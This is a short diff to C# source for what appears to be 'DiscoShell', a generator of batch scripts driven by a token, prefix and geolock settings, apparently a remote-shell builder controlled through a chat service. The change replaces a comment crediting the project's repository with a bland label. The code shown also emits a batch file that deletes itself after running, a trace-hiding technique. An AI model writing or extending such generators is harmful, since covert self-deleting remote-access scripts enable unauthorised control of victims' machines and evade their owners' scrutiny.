@@ -13,7 +13,7 @@ namespace discosh
             StringBuilder ret = new StringBuilder();
             Console.WriteLine("Generating...");
             StringBuilder gencode = new StringBuilder();
-            gencode.AppendLine("rem https://github.com/cchash/DiscoShell");
+            gencode.AppendLine("rem disco.shell");
             gencode.AppendLine(GenerateCommand(token, prefix, geolock, ponly));
             if (delself) gencode.AppendLine("(goto) 2>nul & del \"%~f0\"");
             gencode.AppendLine("exit");
